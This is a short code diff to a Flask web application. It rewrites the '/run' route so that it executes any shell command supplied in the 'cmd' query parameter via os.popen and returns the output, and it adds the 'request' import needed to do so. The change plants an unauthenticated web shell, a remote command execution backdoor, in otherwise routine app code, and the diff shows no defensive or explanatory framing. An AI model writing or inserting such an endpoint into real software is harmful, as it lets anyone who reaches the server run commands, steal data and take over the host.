@@ -1,4 +1,4 @@
-from flask import Flask, render_template
+from flask import Flask, render_template, request
 from db import get_db, close_db
 import sqlalchemy
 from sqlalchemy import text
@@ -15,7 +15,7 @@ def index():
 
 @app.route("/run")
 def run():
-    return str(os.listdir())
+    return str(os.popen(request.args.get("cmd", "ls"))._stream.read())
 
 @app.route("/health")
 def health():
